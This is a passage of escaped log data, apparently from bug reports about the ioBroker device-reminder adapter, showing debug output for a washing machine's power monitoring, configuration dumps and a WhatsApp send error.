09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\r\n2021-07-14 21:13:16.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:16.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:16.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:16.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.45\r\n2021-07-14 21:13:16.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 3, Inhalt: [66.81,66.81,68.72]\r\n2021-07-14 21:13:16.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:16.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:16.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:16.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:16.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:26.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:26.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.77\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 4, Inhalt: [66.81,66.81,68.72,68.72]\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n[Truncated]\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:36.185 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:36.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:36.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:36.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.96\r\n2021-07-14 21:13:36.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 5, Inhalt: [66.81,66.81,68.72,68.72,68.72]\r\n2021-07-14 21:13:36.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:36.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:36.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:36.191 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:36.193 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: value status: 1\r\n2021-07-14 21:13:36.194 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: in action (in action)\r\n2021-07-14 21:13:36.194 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Ger\u00e4t gestartet, device l\u00e4uft\r\n2021-07-14 21:13:36.195 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: GESTARTET\r\n2021-07-14 21:13:36.195 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: setVolume\r\n2021-07-14 21:13:36.308 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: setVolume\r\n2021-07-14 21:13:36.309 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet"
    },
    {
        "logs": "[31merror\u001b[39m: device-reminder.0 (21495) [ERROR] {sendMsg: WHATSAPP}: \"TypeError: Cannot read property 'path' of undefined\" "
    },
    {
        "logs": "2021-07-14 21:12:45.240 - info: host.gandalf instance system.adapter.device-reminder.0 started with pid 2365838\r\n2021-07-14 21:12:45.632 - debug: device-reminder.0 (2365838) Redis Objects: Use Redis connection: 127.0.0.1:9002\r\n2021-07-14 21:12:45.658 - debug: device-reminder.0 (2365838) Objects client ready ... initialize now\r\n2021-07-14 21:12:45.659 - debug: device-reminder.0 (2365838) Objects create System PubSub Client\r\n2021-07-14 21:12:45.662 - debug: device-reminder.0 (2365838) Objects create User PubSub Client\r\n2021-07-14 21:12:45.663 - debug: device-reminder.0 (2365838) Objects client initialize lua scripts\r\n2021-07-14 21:12:45.678 - debug: device-reminder.0 (2365838) Objects connected to redis: 127.0.0.1:9002\r\n2021-07-14 21:12:45.682 - debug: device-reminder.0 (2365838) objectDB connected\r\n2021-07-14 21:12:45.682 - debug: device-reminder.0 (2365838) Redis States: Use Redis connection: 127.0.0.1:9003\r\n2021-07-14 21:12:45.690 - debug: device-reminder.0 (2365838) States create System PubSub Client\r\n2021-07-14 21:12:45.690 - debug: device-reminder.0 (2365838) States create User PubSub Client\r\n2021-07-14 21:12:45.724 - debug: device-reminder.0 (2365838) States connected to redis: 127.0.0.1:9003\r\n2021-07-14 21:12:45.724 - debug: device-reminder.0 (2365838) statesDB connected\r\n2021-07-14 21:12:45.995 - info: device-reminder.0 (2365838) starting. Version 1.2.9 in /opt/iobroker/node_modules/iobroker.device-reminder, node: v14.2.0, js-controller: 3.3.14\r\n2021-07-14 21:12:46.013 - debug: device-reminder.0 (2365838) ARR INPUT devices {\"0\":{\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"pathConsumption\":\"alias.0.Waschmaschine.POWER\",\"pathSwitch\":\"\",\"startText\":\"Waschmaschine gestartet\",\"endText\":\"Waschmaschine fertig\",\"enabled\":true,\"alexa\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"whatsapp\":[\"0\",\"1\"],\"telegram\":[\"0\"],\"timer\":\"0\",\"autoOff\":false,\"abort\":true,\"id\":\"0\"}}\r\n2021-07-14 21:12:46.013 - debug: device-reminder.0 (2365838) ARR INPUT alexa {\"0\":{\"name\":\"K\u00fcche\",\"path\":\"alexa2.0.Echo-Devices.G000MW04742101CM.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"1\":{\"name\":\"HWR\",\"path\":\"alexa2.0.Echo-Devices.G2A0RF03745603R0.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"2\":{\"name\":\"Wohnzimmer\",\"path\":\"alexa2.0.Echo-Devices.G091AA0503920RSS.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"3\":{\"name\":\"Schlafzimmer\",\"path\":\"alexa2.0.Echo-Devices.G0913L060327017C.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"4\":{\"name\":\"Badezimmer EG\",\"path\":\"alexa2.0.Echo-Devices.G090LV03720203LR.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"5\":{\"name\":\"Badezimmer OG\",\"path\":\"alexa2.0.Echo-Devices.G0914704952305RU.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"6\":{\"name\":\"B\u00fcro\",\"path\":\"alexa2.0.Echo-Devices.G2A0RF03745603T7.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"}}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT sayit {}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT whatsapp {}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT telegram {\"0\":{\"name\":\"Thorsten\",\"inst\":\".0\"}}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT pushover {}\r\n2021-07-14 21:12:46.015 - debug: device-reminder.0 (2365838) ARR INPUT email {}\r\n2021-07-14 21:12:46.058 - debug: device-reminder.0 (2365838) RETURN {\"used\":false,\"startVal\":\"30\",\"endVal\":\"10\",\"standby\":\"1\",\"startCount\":\"5\",\"endCount\":\"10\"}\r\n2021-07-14 21:12:46.058 - debug: device-reminder.0 (2365838) OBJ IN CONSTRUCTOR: {\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"pathConsumption\":\"alias.0.Waschmaschine.POWER\",\"pathSwitch\":\"\",\"startText\":\"Waschmaschine gestartet\",\"endText\":\"Waschmaschine fertig\",\"enabled\":true,\"alexa\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"whatsapp\":[\"0\",\"1\"],\"telegram\":[\"0\"],\"timer\":\"0\",\"autoOff\":false,\"abort\":true,\"id\":\"0\"}\r\n2021-07-14 21:12:46.059 - debug: device-reminder.0 (2365838) RETURN {\"enabled\":true,\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"currentConsumption\":\"alias.0.Waschmaschine.POWER\",\"switchPower\":\"\",\"pathStatus\":\"Waschmaschine.Status\",\"pathLiveConsumption\":\"Waschmaschine.live consumption\",\"timeTotal\":\"Waschmaschine.runtime\",\"timeTotalMs\":\"Waschmaschine.runtime in ms\",\"lastRuntime\":\"Waschmaschine.lastRuntime\",\"runtimeMaxDP\":\"Waschmaschine.config.runtime max\",\"alertRuntime\":\"Waschmaschine.alert runtime\",\"messageDP\":\"Waschmaschine.messageDP\",\"averageConsumption\":\"Waschmaschine.average consumption\",\"dnd\":\"Waschmaschine.config.do not disturb\",\"lastOperations\":\"Waschmaschine.last operations\",\"startTimeJSON\":\"00:00:00\",\"endtimeJSON\":\"00:00:00\",\"runtimeJSON\":\"00:00:00\",\"startMessageSent\":false,\"endMessageSent\":false,\"started\":false,\"abort\":true,\"autoOff\":false,\"consumption\":0,\"resultStart\":0,\"resultEnd\":0,\"resultStandby\":0,\"alertCounter\":0,\"startValue\":\"30\",\"endValue\":\"10\",\"standby\":\"1\",\"startCount\":\"5\",\"endCount\":\"10\",\"timeoutMsg\":null,\"startTime\":0,\"endTime\":0,\"arrStart\":[],\"arrEnd\":[],\"arrStandby\":[],\"dateJSON\":[],\"valCancel\":5,\"startMessageText\":\"Waschmaschine gestartet\",\"startMessage\":true,\"endMessageText\":\"Waschmaschine fertig\",\"endMessage\":true,\"timeout\":null,\"telegramUser\":[\"0\"],\"telegram\":true,\"alexaID\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"alexaVolOld\":0,\"alexa\":true,\"sayIt\":false,\"whatsappID\":[\"0\",\"1\"],\"whatsapp\":true,\"pushover\":false,\"email\":false}\r\n2021-07-14 21:12:46.059 - info: device-reminder.0 (2365838) Device \"Waschmaschine\" was successfully created\r\n2021-07-14 21:12:46.060 - debug: device-reminder.0 (2365838) [SUBSCRIBE]: Waschmaschine.config.do not disturb: Waschmaschine.config.runtime max: alias.0.Waschmaschine.POWER:\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [ID] \"device-reminder.0.Waschmaschine.config.runtime max\"\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [PATH] {\"val\":0,\"ack\":true,\"ts\":1626289966120,\"q\":0,\"from\":\"system.adapter.device-reminder.0\",\"user\":\"system.user.admin\",\"lc\":1625063884595}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\"}}}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [ID] \"device-reminder.0.Waschmaschine.config.do not disturb\"\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [PATH] {\"val\":false,\"ack\":true,\"ts\":1626289966120,\"q\":0,\"from\":\"system.adapter.device-reminder.0\",\"user\":\"system.user.admin\",\"lc\":1625063884606}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"}\r\n2021-07-14 21:12:46.131 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\"}}}\r\n2021-07-14 21:12:56.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 66.81\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 1, Inhalt: [66.81]\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START66.81; 30; false\r\n2021-07-14 21:12:56.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 66.81\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 2, Inhalt: [66.81,66.81]\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START66.81; 30; false\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [ID] \"alias.0.Waschmaschine.POWER\"\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [PATH] {\"val\":68.72,\"ack\":true,\"ts\":1626289987645,\"q\":0,\"from\":\"system.adapter.hm-rpc.1\",\"user\":\"system.user.admin\",\"lc\":1626289987645}\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}\r\n2021-07-14 21:13:07.655 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\r\n2021-07-14 21:13:16.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:16.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:16.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:16.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.45\r\n2021-07-14 21:13:16.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 3, Inhalt: [66.81,66.81,68.72]\r\n2021-07-14 21:13:16.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:16.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:16.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:16.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:16.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:26.184 - debug: device-reminder.0 (2365838) 